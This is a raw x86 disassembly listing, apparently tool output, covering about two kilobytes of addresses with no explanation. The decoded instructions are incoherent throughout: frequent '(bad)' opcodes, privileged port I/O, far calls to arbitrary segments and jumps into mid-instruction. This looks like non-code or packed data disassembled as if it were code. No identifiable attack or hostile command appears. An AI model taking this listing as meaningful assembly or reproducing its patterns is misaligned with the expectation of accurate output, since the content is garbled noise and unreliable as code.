  431e03:	and    esi,DWORD PTR [eax]
  431e05:	sub    ah,BYTE PTR [ebp+0x43ba25f6]
  431e0b:	push   edx
  431e0c:	adc    esi,DWORD PTR [edx]
  431e0e:	repz je 0x431dcd
  431e11:	add    al,0xd1
  431e13:	hlt    
  431e14:	loop   0x431e06
  431e16:	xchg   bh,bh
  431e18:	mov    ds:0x2541b00c,al
  431e1d:	fstp   QWORD PTR [edx-0x1931d00]
  431e23:	pop    edx
  431e24:	or     ebx,DWORD PTR [esi+0x1aa2fc6d]
  431e2a:	xchg   esi,eax
  431e2b:	ins    DWORD PTR es:[edi],dx
  431e2c:	loopne 0x431dcf
  431e2e:	mov    al,ds:0x149742df
  431e33:	dec    ebx
  431e34:	mov    es,WORD PTR [esi+0xc]
  431e37:	aam    0x82
  431e39:	mov    cl,BYTE PTR [esi]
  431e3b:	cmp    ch,BYTE PTR [edi+0x5d0eb114]
  431e41:	mov    ebp,DWORD PTR [eax+0x1b]
  431e44:	ds jns 0x431e2e
  431e47:	out    dx,al
  431e48:	fwait
  431e49:	dec    esp
  431e4a:	ds mov al,0xb1
  431e4d:	shr    BYTE PTR [eax],0x4e
  431e50:	or     al,0xfa
  431e52:	jg     0x431e7e
  431e54:	cmp    cl,BYTE PTR [edx+edi*8+0x78247e8a]
  431e5b:	loop   0x431e6d
  431e5d:	push   esp
  431e5e:	add    esp,DWORD PTR ds:0xf5ce8aa1
  431e64:	mov    eax,0x44d8f034
  431e69:	inc    ebp
  431e6a:	xor    dl,dh
  431e6c:	or     ebx,esp
  431e6e:	and    DWORD PTR [edx+0x28],edx
  431e71:	adc    al,0x71
  431e73:	add    BYTE PTR [eax+0x7c],ch
  431e76:	mov    ds:0xa86d04ae,al
  431e7b:	(bad)  
  431e7c:	push   ds
  431e7d:	sub    al,0x3
  431e7f:	call   0x131a4ca0
  431e84:	xor    DWORD PTR ss:[edx-0x61fb8e7e],eax
  431e8b:	xor    al,0x1f
  431e8d:	dec    esp
  431e8e:	xor    al,0x5b
  431e90:	xor    BYTE PTR [ecx-0x7c],dl
  431e93:	and    ecx,esp
  431e95:	test   BYTE PTR [edi],dl
  431e97:	pop    esi
  431e98:	pop    eax
  431e99:	ret    0x7768
  431e9c:	int3   
  431e9d:	(bad)  
  431e9e:	int    0x5d
  431ea0:	cmp    esp,DWORD PTR [eax+eax*4-0x3a]
  431ea4:	aam    0x1e
  431ea6:	add    BYTE PTR [eax-0x6ce360f5],dl
  431eac:	push   0x1bf9f60f
  431eb1:	fsub   QWORD PTR [esi-0x7d0787c2]
  431eb7:	sub    ah,BYTE PTR ds:0x8c8465e4
  431ebd:	dec    edx
  431ebe:	pop    ds
  431ebf:	and    BYTE PTR [eax+edi*8+0x4f],ch
  431ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431ec4:	pop    eax
  431ec5:	mov    eax,0xb1aeda14
  431eca:	cmp    eax,0x75703d1e
  431ecf:	addr16 into 
  431ed1:	dec    eax
  431ed2:	loop   0x431f3d
  431ed4:	call   0x8168:0x48e20c4d
  431edb:	mov    BYTE PTR [esi],dl
  431edd:	xchg   edx,eax
  431ede:	inc    ecx
  431edf:	jp     0x431e82
  431ee1:	ins    DWORD PTR es:[edi],dx
  431ee2:	retf   0x7a09
  431ee5:	les    ebx,FWORD PTR [ebx]
  431ee7:	(bad)  
  431ee8:	sub    BYTE PTR [esp+eiz*4+0x76],bh
  431eec:	push   es
  431eed:	rcr    BYTE PTR [edx+0x41bc8d3e],cl
  431ef3:	cmp    al,0x40
  431ef5:	js     0x431e89
  431ef7:	mov    esp,0xf7540ae
  431efc:	sbb    BYTE PTR [edx],0x8a
  431eff:	out    dx,al
  431f00:	mov    ah,0x2c
  431f02:	or     DWORD PTR [edx+eax*8+0x69],edi
  431f06:	ins    BYTE PTR es:[edi],dx
  431f07:	push   es
  431f08:	sbb    eax,DWORD PTR [eax+0x461ed88e]
  431f0e:	pop    es
  431f0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f10:	jp     0x431ef4
  431f12:	mov    WORD PTR ds:0xc8cb2060,?
  431f18:	add    al,ah
  431f1a:	retf   
  431f1b:	bound  ebx,QWORD PTR [ebp+0x1982da92]
  431f21:	sub    ah,BYTE PTR [eax+0x60956bde]
  431f27:	sbb    esi,0x78b3b3d2
  431f2d:	js     0x431f71
  431f2f:	inc    edx
  431f30:	mov    al,ds:0xc8a08089
  431f35:	mov    ds:0x215df200,eax
  431f3a:	aad    0xf0
  431f3c:	inc    eax
  431f3d:	scas   al,BYTE PTR es:[edi]
  431f3e:	nop
  431f3f:	(bad)  
  431f40:	stos   DWORD PTR es:[edi],eax
  431f41:	fidiv  WORD PTR [eax]
  431f43:	push   esp
  431f44:	and    BYTE PTR [ecx-0x21],bl
  431f47:	jbe    0x431fbb
  431f49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431f4a:	imul   ebx,DWORD PTR [ebx+0x5420fa98],0xffffffa4
  431f51:	xchg   esp,eax
  431f52:	jo     0x431fd2
  431f54:	adc    dh,bh
  431f56:	sbb    al,0x81
  431f58:	and    dh,BYTE PTR [ecx+0x17b6de01]
  431f5e:	push   es
  431f5f:	sbb    al,BYTE PTR ds:0xd98c8c88
  431f65:	not    BYTE PTR [ebx]
  431f67:	fwait
  431f68:	std    
  431f69:	dec    edx
  431f6a:	js     0x431f7b
  431f6c:	mov    eax,0x6eedd9e2
  431f71:	dec    ecx
  431f72:	lds    ecx,FWORD PTR [eax-0x5f7a249f]
  431f78:	cld    
  431f79:	dec    edx
  431f7a:	pop    edi
  431f7b:	adc    BYTE PTR [ecx],0x80
  431f7e:	push   0x62
  431f80:	leave  
  431f81:	test   BYTE PTR [ebp+ebx*1-0x3935bf65],0xa8
  431f89:	adc    al,0xf0
  431f8b:	mov    WORD PTR [ebx+0x3c],?
  431f8e:	ficomp WORD PTR [esp+edi*1]
  431f91:	xchg   BYTE PTR [ecx+0x2af0483d],dh
  431f97:	mov    al,ds:0x6c1e161f
  431f9c:	sub    al,0xf8
  431f9e:	cld    
  431f9f:	cli    
  431fa0:	jb     0x431fb8
  431fa2:	jo     0x431f54
  431fa4:	mov    al,ds:0xd686c658
  431fa9:	jl     0x431fb8
  431fab:	cs jne 0x431f76
  431fae:	add    ebp,ebp
  431fb0:	jb     0x431f6e
  431fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431fb3:	icebp  
  431fb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431fb5:	stos   DWORD PTR es:[edi],eax
  431fb6:	fisttp QWORD PTR [ebp+ecx*2+0x1981246b]
  431fbd:	sub    BYTE PTR ds:0xa58d226,0x2c
  431fc4:	pop    edx
  431fc5:	and    eax,0x98404bac
  431fca:	jo     0x431f9d
  431fcc:	mov    cs,WORD PTR [esi+edx*2]
  431fcf:	adc    eax,0x4fb42ab4
  431fd4:	sub    BYTE PTR [edx+0x7d12c9a8],0x82
  431fdb:	mov    al,ds:0xfc02871d
  431fe0:	mov    ch,0x30
  431fe2:	repz mov WORD PTR [ebx+0x6a],es
  431fe6:	ret    
  431fe7:	adc    DWORD PTR [esi-0x74c5c7ee],edi
  431fed:	(bad)  
  431fee:	cld    
  431fef:	add    BYTE PTR [eax-0x5b],dl
  431ff2:	cmp    BYTE PTR [esi],bl
  431ff4:	aas    
  431ff5:	fidivr WORD PTR [edi]
  431ff7:	fcom   QWORD PTR [ecx-0x98fd580]
  431ffd:	in     al,0xad
  431fff:	fcmovu st,st(2)
  432001:	inc    edx
  432002:	(bad)  [eax-0x5b418eaa]
  432008:	mov    esi,DWORD PTR ds:0xad28d104
  43200e:	push   0x1071324f
  432013:	imul   ecx,DWORD PTR [ebx+esi*2-0x3c],0x1f1b43d9
  43201b:	jl     0x431fb2
  43201d:	xchg   esi,eax
  43201e:	add    al,0xe6
  432020:	cmp    al,0xfa
  432022:	pop    esp
  432023:	mov    bl,al
  432025:	mov    esp,0xd7a78e
  43202a:	aas    
  43202b:	adc    DWORD PTR ss:[edx+0x14741697],edx
  432032:	adc    eax,0xc1e06f06
  432037:	or     al,0xc7
  432039:	cmp    al,0x1a
  43203b:	inc    ebx
  43203c:	mov    edx,0x50b9b102
  432041:	(bad)  
  432042:	mov    bh,0xec
  432044:	lods   al,BYTE PTR ds:[esi]
  432045:	push   ecx
  432046:	sub    al,0x3c
  432048:	sbb    DWORD PTR [ebp-0x2],eax
  43204b:	sbb    al,0x54
  43204d:	push   ebp
  43204e:	mov    ds:0x6c9a2447,al
  432053:	std    
  432054:	pop    esi
  432055:	sbb    DWORD PTR [eax+0xe],esi
  432058:	pop    ss
  432059:	or     BYTE PTR [esi],0xf3
  43205c:	loope  0x43205e
  43205e:	in     al,0x8f
  432060:	pusha  
  432061:	cli    
  432062:	into   
  432063:	mov    ds:0x2c228551,al
  432068:	and    DWORD PTR [eax],ebp
  43206a:	out    0x26,al
  43206c:	or     bl,BYTE PTR [edx+0x54f4f63d]
  432072:	push   0x76
  432074:	mov    cl,0x1e
  432076:	shl    al,0xed
  432079:	sbb    DWORD PTR [edx+0x38],ebp
  43207c:	pop    ebp
  43207d:	pushf  
  43207e:	push   ss
  43207f:	jbe    0x4320d5
  432081:	inc    esp
  432082:	add    dh,bh
  432084:	sbb    DWORD PTR [edi],edx
  432086:	mov    eax,ds:0x3a6ecdaa
  43208b:	std    
  43208c:	lods   eax,DWORD PTR ds:[esi]
  43208d:	int3   
  43208e:	or     bl,BYTE PTR [ecx+edx*8+0x65]
  432092:	mov    dh,0xda
  432094:	jecxz  0x4320be
  432096:	sbb    al,0x42
  432098:	fisub  DWORD PTR [eax+0x14]
  43209b:	jle    0x4320ed
  43209d:	pop    eax
  43209e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43209f:	xchg   esp,eax
  4320a0:	in     eax,0x90
  4320a2:	stos   BYTE PTR es:[edi],al
  4320a3:	sub    bh,BYTE PTR [edi]
  4320a5:	and    eax,0x98b0476d
  4320aa:	loop   0x432055
  4320ac:	lods   al,BYTE PTR cs:[esi]
  4320ae:	int3   
  4320af:	or     al,0xa4
  4320b1:	add    cl,BYTE PTR [edx]
  4320b3:	outs   dx,BYTE PTR ds:[esi]
  4320b4:	and    al,cl
  4320b6:	add    ch,ch
  4320b8:	fadd   DWORD PTR [edx+0x17268002]
  4320be:	aam    0x46
  4320c0:	pop    ecx
  4320c1:	in     al,0xa0
  4320c3:	cmp    al,BYTE PTR ds:0x6456b6d6
  4320c9:	lods   al,BYTE PTR ds:[esi]
  4320ca:	mov    eax,0x41b56a13
  4320cf:	cs retf 
  4320d1:	sub    BYTE PTR [esi+0x55a30f5f],ch
  4320d7:	inc    edx
  4320d8:	dec    esi
  4320d9:	dec    ecx
  4320da:	fmul   QWORD PTR [eax-0x3bee1c20]
  4320e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4320e1:	mov    ds:0x4ad12d6,eax
  4320e6:	rol    BYTE PTR [edx],1
  4320e8:	pop    edx
  4320e9:	mov    bl,0xb6
  4320eb:	(bad)  
  4320ec:	push   cs
  4320ed:	outs   dx,DWORD PTR ds:[esi]
  4320ee:	or     BYTE PTR [ecx+0xabb5e70],0xd6
  4320f5:	push   ebx
  4320f6:	loope  0x43208e
  4320f8:	test   dh,dh
  4320fa:	in     al,0xee
  4320fc:	call   0x50ddb669
  432101:	jp     0x43214f
  432103:	add    BYTE PTR [ebx-0x20],dl
  432106:	sbb    al,BYTE PTR [edx+0x45]
  432109:	test   DWORD PTR [edx-0x6a89ad54],ebp
  43210f:	fwait
  432110:	or     al,0xbb
  432112:	lods   al,BYTE PTR ds:[esi]
  432113:	in     al,0xf1
  432115:	fs or  bl,dh
  432118:	mov    DWORD PTR [edx],0xb08ddda0
  43211e:	mov    al,0xe1
  432120:	add    al,0x18
  432122:	mov    al,ds:0xbeab89e0
  432127:	inc    eax
  432128:	popa   
  432129:	cmp    ebx,DWORD PTR [edx]
  43212b:	jns    0x43215b
  43212d:	mov    dl,0x68
  43212f:	out    dx,al
  432130:	outs   dx,DWORD PTR ds:[esi]
  432131:	loope  0x4320c5
  432133:	fdivr  DWORD PTR [edx]
  432135:	mov    edx,0x3b6ba092
  43213a:	jp     0x43217b
  43213c:	and    DWORD PTR [ecx-0x7ea9ffaa],eax
  432142:	ror    BYTE PTR [esi-0x3b549e80],1
  432148:	les    ecx,FWORD PTR [ecx]
  43214a:	jb     0x432136
  43214c:	mov    edi,?
  43214e:	sub    BYTE PTR [edx-0x3baf5ade],al
  432154:	jecxz  0x432110
  432156:	into   
  432157:	test   eax,0x9f58518
  43215c:	(bad)  
  43215d:	xchg   edi,eax
  43215e:	push   es
  43215f:	hlt    
  432160:	add    al,BYTE PTR [ebp-0x14]
  432163:	lahf   
  432164:	sub    al,0x7c
  432166:	rol    DWORD PTR [eax+ebp*8],cl
  432169:	into   
  43216a:	add    BYTE PTR ds:[esi-0xd],bl
  43216e:	int3   
  43216f:	mov    esp,0x92f08315
  432174:	push   0xb64406a6
  432179:	out    0x18,al
  43217b:	stos   BYTE PTR es:[edi],al
  43217c:	or     al,0xdb
  43217e:	jecxz  0x4321de
  432180:	and    bh,al
  432182:	and    eax,0xa380d6ce
  432187:	xor    eax,DWORD PTR [edi+edx*4+0x5346e36]
  43218e:	mov    esi,0xd57d3520
  432193:	sub    ah,ah
  432195:	or     ah,BYTE PTR [eax+0x0]
  432198:	mov    esi,0x41ac46bd
  43219d:	sub    ebx,DWORD PTR [edx]
  43219f:	cs enter 0xec8,0x57
  4321a4:	mov    al,ds:0x1535f8a4
  4321a9:	or     BYTE PTR [ebx-0x7c],0x33
  4321ad:	push   ds
  4321ae:	out    dx,al
  4321af:	imul   edx,DWORD PTR [eax+esi*4],0x921a6841
  4321b6:	(bad)  
  4321b7:	fcomp  QWORD PTR ds:0x447a6126
  4321bd:	aad    0xac
  4321bf:	sbb    BYTE PTR [eax+ebp*1-0x58],0x68
  4321c4:	scas   al,BYTE PTR es:[edi]
  4321c5:	mov    ebx,0xd02a820e
  4321ca:	jno    0x432244
  4321cc:	ret    0xd9b0
  4321cf:	or     ebp,DWORD PTR [ebp-0x3b1e68e4]
  4321d5:	xchg   ebx,eax
  4321d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4321d7:	or     al,BYTE PTR [esi+0x39]
  4321da:	leave  
  4321db:	lods   eax,DWORD PTR ds:[esi]
  4321dc:	mov    ds:0x320648a1,eax
  4321e1:	inc    esp
  4321e2:	xor    bl,BYTE PTR [edi-0x3a]
  4321e5:	jl     0x4321c3
  4321e7:	mov    bh,0x68
  4321e9:	fwait
  4321ea:	dec    edx
  4321eb:	mov    al,0xca
  4321ed:	cmp    dh,BYTE PTR [edx-0x11469966]
  4321f3:	cmp    DWORD PTR [ecx-0x7395ef1f],esi
  4321f9:	cmc    
  4321fa:	sub    al,0xfa
  4321fc:	fisub  DWORD PTR [edx-0x2]
  4321ff:	or     ebx,0x79d2b2b8
  432205:	jbe    0x4321af
  432207:	adc    eax,0xb6a28a88
  43220c:	mov    edx,0xc16495e8
  432211:	dec    ebp
  432212:	(bad)  [esi]
  432214:	cmp    al,0xd0
  432216:	and    dl,dh
  432218:	loopne 0x4321c2
  43221a:	js     0x43225d
  43221c:	loope  0x4321b6
  43221e:	mov    esi,0xc4247ed6
  432223:	push   0x78
  432225:	cmp    BYTE PTR [esi],0x93
  432228:	push   ss
  432229:	dec    ebx
  43222a:	mov    ecx,0x51d4354
  43222f:	push   eax
  432230:	sbb    dl,BYTE PTR [esi-0x7e]
  432233:	pcmpgtd mm3,QWORD PTR [edx+0x4b]
  432237:	ficomp DWORD PTR [esi]
  432239:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43223a:	and    al,0x92
  43223c:	dec    BYTE PTR [esi+0x3624a354]
  432242:	adc    al,0x3c
  432244:	outs   dx,BYTE PTR ds:[esi]
  432245:	add    BYTE PTR [ebx+ebp*2+0x4cb4b0],0x1d
  43224d:	adc    eax,0x4c7c381f
  432252:	pop    ebx
  432253:	adc    dh,al
  432255:	inc    edx
  432256:	sub    edi,DWORD PTR [edx+0x599e4a22]
  43225c:	out    0x10,al
  43225e:	inc    eax
  43225f:	in     eax,0x68
  432261:	mov    eax,0xdebef100
  432266:	and    dh,ah
  432268:	xor    BYTE PTR [eax+0x6d6bb6bb],bl
  43226e:	das    
  43226f:	in     al,0x61
  432271:	test   DWORD PTR [eax],0x1b7f7c8e
  432277:	push   edx
  432278:	dec    esi
  432279:	call   0x18893faa
  43227e:	pop    edi
  43227f:	and    BYTE PTR [ebx+edx*8],0x78
  432283:	aam    0x64
  432285:	and    al,0x6c
  432287:	or     ah,BYTE PTR [edx]
  432289:	(bad)  
  43228a:	mov    ds:0xc380d1be,eax
  43228f:	and    edx,ebx
  432291:	mov    al,ds:0x726237a4
  432296:	fisubr DWORD PTR [esi+esi*4-0x17]
  43229a:	sbb    dh,ah
  43229c:	sti    
  43229d:	hlt    
  43229e:	sub    dh,BYTE PTR [ebp-0x42]
  4322a1:	sbb    ch,BYTE PTR [ebx+0x28534d03]
  4322a7:	sbb    ah,BYTE PTR [edi-0x59]
  4322aa:	cli    
  4322ab:	mov    al,0x1c
  4322ad:	ins    DWORD PTR es:[edi],dx
  4322ae:	stos   BYTE PTR es:[edi],al
  4322af:	push   ss
  4322b0:	pop    edx
  4322b1:	sub    ecx,DWORD PTR [ecx+0x2a]
  4322b4:	add    bh,BYTE PTR [ebx+0xf0d88fa]
  4322ba:	lea    di,es:[edx+0x42]
  4322bf:	in     al,dx
  4322c0:	mov    ds:0x7460509a,eax
  4322c5:	es xor al,0xd3
  4322c8:	rol    DWORD PTR [ecx],0x89
  4322cb:	bound  esp,QWORD PTR [ebp+ecx*2+0x3a06eeaa]
  4322d2:	test   BYTE PTR [edi],cl
  4322d4:	popa   
  4322d5:	mov    bh,0x78
  4322d7:	(bad)  
  4322d8:	inc    ebp
  4322d9:	dec    esp
  4322da:	ret    
  4322db:	iret   
  4322dc:	nop
  4322dd:	jbe    0x432317
  4322df:	and    al,0x60
  4322e1:	mov    al,0x2c
  4322e3:	pop    edx
  4322e4:	mov    ebp,0xa99c2d1b
  4322e9:	xchg   DWORD PTR [esi+0x45a29d08],esp
  4322ef:	add    ecx,DWORD PTR [ebx]
  4322f1:	adc    al,0x16
  4322f3:	jmp    0xc027:0x82d0fb2c
  4322fa:	and    dh,BYTE PTR [edx+0x11]
  4322fd:	cld    
  4322fe:	xor    BYTE PTR [ebp+0x2fd3524],ah
  432304:	add    cl,bh
  432306:	jecxz  0x432308
  432308:	das    
  432309:	mov    eax,0x5536d5b1
  43230e:	cmp    ah,cl
  432310:	push   0xffffffac
  432312:	push   edx
  432313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432314:	cmc    
  432315:	push   edx
  432316:	cld    
  432317:	add    eax,0xeabe3a1b
  43231c:	sbb    eax,0xfc807824
  432321:	or     BYTE PTR [eax],al
  432323:	and    ecx,DWORD PTR [ebp-0x3a]
  432326:	push   ecx
  432327:	push   0xd8cae494
  43232c:	stos   DWORD PTR es:[edi],eax
  43232d:	or     eax,0x7a0da282
  432332:	mov    al,ds:0x6ca88679
  432337:	push   esi
  432338:	push   edx
  432339:	ins    DWORD PTR es:[edi],dx
  43233a:	xlat   BYTE PTR ds:[ebx]
  43233b:	adc    eax,0x4d82e18d
  432340:	ds out 0x25,eax
  432343:	pop    eax
  432344:	jmp    0x432309
  432346:	scas   al,BYTE PTR es:[edi]
  432347:	dec    ebx
  432348:	adc    esp,DWORD PTR [eax+0x26]
  43234b:	push   cs
  43234c:	sbb    edi,DWORD PTR [eax-0x2b6c3974]
  432352:	add    eax,0xf0164f72
  432357:	(bad)  
  432358:	aad    0x80
  43235a:	xchg   edx,eax
  43235b:	imul   BYTE PTR [edx]
  43235d:	jno    0x43235f
  43235f:	scas   al,BYTE PTR es:[edi]
  432360:	xchg   ebp,eax
  432361:	test   BYTE PTR [edx-0x3e2bcdec],bh
  432367:	mov    al,0xa0
  432369:	aam    0x85
  43236b:	or     eax,DWORD PTR [edx+0x10]
  43236e:	or     ah,cl
  432370:	push   eax
  432371:	sahf   
  432372:	inc    esp
  432373:	cmp    al,0x4
  432375:	mov    al,BYTE PTR [ebp-0x2b4b3b10]
  43237b:	call   0x7633:0xd6d616cc
  432382:	cmp    esp,DWORD PTR [esi]
  432384:	and    cl,0x30
  432387:	or     BYTE PTR [esi-0x6709fa60],dl
  43238d:	rcl    BYTE PTR [edx-0x64],cl
  432390:	je     0x4323c1
  432392:	retfw  0x170c
  432396:	test   al,0x4
  432398:	repz sub BYTE PTR [eax],0x6c
  43239c:	mov    DWORD PTR [eax],eax
  43239e:	cmp    bh,0x88
  4323a1:	mov    ebx,0x4e769a04
  4323a6:	mov    ?,WORD PTR [edi-0x42]
  4323a9:	adc    bh,BYTE PTR [ebp+ebx*8+0x58]
  4323ad:	(bad)  
  4323ae:	fcom   st(1)
  4323b0:	pop    edx
  4323b1:	fwait
  4323b2:	fs jb  0x432431
  4323b5:	pop    edi
  4323b6:	push   es
  4323b7:	dec    edi
  4323b8:	aas    
  4323b9:	mov    bl,dh
  4323bb:	dec    esp
  4323bc:	jecxz  0x43233f
  4323be:	mov    BYTE PTR ds:0xad2a71ae,cl
  4323c4:	mov    al,ds:0xb6d8f0e8
  4323c9:	aam    0x74
  4323cb:	fild   WORD PTR [ebx+eiz*4+0x42150882]
  4323d2:	adc    eax,0xa0b5a205
  4323d7:	adc    eax,0x449ab514
  4323dc:	aas    
  4323dd:	and    al,0x2a
  4323df:	data16 aam 0xce
  4323e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4323e3:	sbb    ch,BYTE PTR [edi]
  4323e5:	inc    ecx
  4323e6:	adc    eax,0x24457684
  4323eb:	add    DWORD PTR [ebx+0x1c9e8a81],esi
  4323f1:	push   edi
  4323f2:	jp     0x4323a8
  4323f4:	stos   DWORD PTR es:[edi],eax
  4323f5:	ret    0xd23a
  4323f8:	(bad)  [eax]
  4323fa:	fs jp  0x4323a7
  4323fd:	xor    BYTE PTR [ecx],dh
  4323ff:	push   0xf2063c02
  432404:	lods   eax,DWORD PTR ds:[esi]
  432405:	adc    BYTE PTR [edx+edx*2],dh
  432408:	bound  edx,QWORD PTR [eax]
  43240a:	scas   eax,DWORD PTR es:[edi]
  43240b:	sub    BYTE PTR [esp+eax*2-0x2c],ch
  43240f:	loop   0x432453
  432411:	pop    ebp
  432412:	arpl   WORD PTR [edx-0x5e],bp
  432415:	mov    ch,0x63
  432417:	inc    eax
  432418:	push   edx
  432419:	push   ss
  43241a:	hlt    
  43241b:	cmp    bh,BYTE PTR [edx+eiz*8+0xd88b1ea]
  432422:	add    dh,BYTE PTR [ecx+ecx*4]
  432425:	mov    dl,BYTE PTR [ebx]
  432427:	aas    
  432428:	pop    eax
  432429:	inc    edx
  43242a:	mov    DWORD PTR [ebx],0x4e5e8656
  432430:	test   DWORD PTR [edx+ecx*4-0x36f50f2a],eax
  432437:	xchg   ebx,eax
  432438:	es ins DWORD PTR es:[edi],dx
  43243a:	xchg   esp,eax
  43243b:	pop    eax
  43243c:	jl     0x432446
  43243e:	inc    eax
  43243f:	test   al,0xd6
  432441:	xchg   ebx,eax
  432442:	outs   dx,BYTE PTR ds:[esi]
  432443:	push   esi
  432444:	inc    eax
  432445:	rol    ecx,cl
  432447:	push   ss
  432448:	add    ebx,DWORD PTR [edx-0x10]
  43244b:	sub    al,0xda
  43244d:	shl    DWORD PTR [edx],0x56
  432450:	sub    DWORD PTR [esi+eiz*4-0x51bbfd26],ecx
  432457:	sub    al,bh
  432459:	push   esp
  43245a:	push   ecx
  43245b:	add    ebx,DWORD PTR [edx+0x1d063b]
  432461:	jle    0x432466
  432463:	or     al,0x7b
  432465:	arpl   WORD PTR [ebx+esi*4+0x6f],bp
  432469:	mov    dh,0xc9
  43246b:	pusha  
  43246c:	cs mov esi,0x1e00c646
  432472:	mov    esi,0xc7f11c58
  432477:	mov    eax,0xa272ab0
  43247c:	rol    BYTE PTR [edx+0x2],0xcc
  432480:	stos   DWORD PTR es:[edi],eax
  432481:	lods   al,BYTE PTR ds:[esi]
  432482:	lods   eax,DWORD PTR ds:[esi]
  432483:	mov    al,ds:0x25820c3
  432488:	pushf  
  432489:	adc    BYTE PTR [edx-0x1f5265b1],ah
  43248f:	pop    es
  432490:	test   BYTE PTR ds:0xe797992,cl
  432496:	mov    eax,0x908caab3
  43249b:	call   0x1cb4:0xe8daa6f0
  4324a2:	cmp    BYTE PTR [eax-0x29],ah
  4324a5:	fdiv   st(4),st
  4324a8:	sbb    BYTE PTR [eax],al
  4324aa:	dec    esp
  4324ab:	and    bh,dl
  4324ad:	jg     0x4324ab
  4324af:	inc    ebp
  4324b0:	mov    eax,es:0x86b8d4c0
  4324b6:	ds mov ecx,0x4d828807
  4324bc:	push   edx
  4324bd:	mov    ds:0x2e6fd8e9,eax
  4324c2:	(bad)  
  4324c4:	add    al,0xe3
  4324c6:	jmp    0x4324f4
  4324c8:	call   0x65a64143
  4324cd:	shl    DWORD PTR [ecx+0x430c89f5],0x54
  4324d4:	xchg   BYTE PTR [ebp-0x46],dl
  4324d7:	cmp    BYTE PTR [ecx-0x761c97f5],al
  4324dd:	stos   BYTE PTR es:[edi],al
  4324de:	stos   BYTE PTR es:[edi],al
  4324df:	mov    ds:0x3448d4bc,al
  4324e4:	mov    al,0xac
  4324e6:	inc    edx
  4324e7:	push   ss
  4324e8:	loopne 0x4324cc
  4324ea:	add    edx,0x2ecfca62
  4324f0:	cwde   
  4324f1:	mov    ds:0xa1b1b0fa,al
  4324f6:	push   0x3d
  4324f8:	inc    esp
  4324f9:	pusha  
  4324fa:	push   ebx
  4324fb:	dec    esi
  4324fc:	or     BYTE PTR ss:[edx+0x30],ch
  432500:	dec    eax
  432501:	repnz push esi
  432503:	call   FWORD PTR [edx]
  432505:	jp     0x43252b
  432507:	xor    al,0xd2
  432509:	pop    esi
  43250a:	callw  0x5b2b
  43250e:	push   ss
  43250f:	xor    eax,0x58dfbe5d
  432514:	fcmove st,st(0)
  432516:	pop    esp
  432517:	pop    eax
  432518:	add    bh,BYTE PTR [edi]
  43251a:	sub    ebp,edi
  43251c:	repnz fs and dh,dh
  432520:	ja     0x432564
  432522:	fiadd  DWORD PTR [edx]
  432524:	shr    DWORD PTR [edi],0xb4
  432527:	xlat   BYTE PTR ds:[ebx]
  432528:	les    edx,FWORD PTR [esi+ebp*2+0x7d]
  43252c:	xlat   BYTE PTR ds:[ebx]
  43252d:	shl    BYTE PTR [edx+0x20fb6309],1
  432533:	int3   
  432534:	popa   
  432535:	and    al,BYTE PTR [edx]
  432537:	push   eax
  432538:	aaa    
  432539:	or     ebx,eax
  43253b:	jbe    0x4325a5
  43253d:	dec    ecx
  43253e:	out    dx,al
  43253f:	out    0xde,eax
  432541:	sahf   
  432542:	es mov edi,0xf44491f0
  432548:	out    0x6f,al
  43254a:	and    edx,edx
  43254c:	sti    
  43254d:	test   DWORD PTR [eax+0x55],ebx
  432550:	push   ecx
  432551:	mov    ss,WORD PTR fs:[edx-0x636105c1]
  432558:	repz fwait
  43255a:	ret    
  43255b:	inc    esp
  43255c:	pop    esp
  43255d:	add    DWORD PTR [esi+0x31],esp
  432560:	inc    eax
  432561:	add    eax,0x82245454
  432566:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  432567:	ret    0xe1b
  43256a:	or     DWORD PTR [edx+0x6d],edi
  43256d:	call   0x8aa4087c
  432572:	jecxz  0x432515
  432574:	adc    eax,0x10563d54
  432579:	pushf  
  43257a:	mov    ss,edx
  43257c:	(bad)  
  43257d:	out    dx,al
  43257e:	dec    ecx
  43257f:	les    edx,FWORD PTR [ebx]
  432581:	push   ebp
  432582:	or     BYTE PTR [esi],bl
  432584:	add    DWORD PTR [eax],0x9aaa123e
  43258a:	ficomp DWORD PTR [esi-0x1c15d6ea]
  432590:	popf   
  432591:	inc    eax
  432592:	ror    DWORD PTR [eax+edi*2],cl
  432595:	and    BYTE PTR [eax],0x39
  432598:	mov    ah,0x40
  43259a:	bound  eax,QWORD PTR fs:[ebx-0x3d]
  43259e:	add    BYTE PTR [ebx-0x745b822c],dh
  4325a4:	mov    DWORD PTR [ebx],ecx
  4325a6:	push   0x4926f4d8
  4325ab:	inc    esi
  4325ac:	call   0x1ad45dc4
  4325b1:	add    DWORD PTR ds:0x2c34e5c,esi
  4325b7:	adc    dh,BYTE PTR [eax+0xf025033]
  4325bd:	add    al,0xe4
  4325bf:	lods   al,BYTE PTR ds:[esi]
  4325c0:	dec    esp
  4325c1:	push   eax
  4325c2:	inc    edx
  4325c3:	xor    ch,BYTE PTR [ebp-0x56]
  4325c6:	cli    
  4325c7:	mov    BYTE PTR [esi-0x2753fd64],bh
  4325cd:	push   0xffffff92
  4325cf:	dec    esi
  4325d0:	and    ah,BYTE PTR [ebx+0x4]
  4325d3:	inc    eax
  4325d4:	imul   edx,DWORD PTR [esi-0x444923a4],0x7c
  4325db:	xor    cl,ah
  4325dd:	call   0x471bc06
  4325e2:	jns    0x432574
  4325e4:	(bad)  
  4325e5:	or     esp,DWORD PTR [ecx-0x79ffbb40]
  4325eb:	dec    edx
  4325ec:	adc    BYTE PTR ds:0x1be84842,dh
  4325f2:	test   dh,dh
  4325f4:	cli    
  4325f5:	pop    ecx
  4325f6:	adc    BYTE PTR [ecx+0xc],cl
  4325f9:	loop   0x43265d
  4325fb:	aad    0x5a
  4325fd:	push   edi
  4325fe:	jae    0x4325d0
  432600:	fdivr  QWORD PTR [esi-0x7a]
  432603:	sub    al,0x6a
  432605:	or     al,0x46
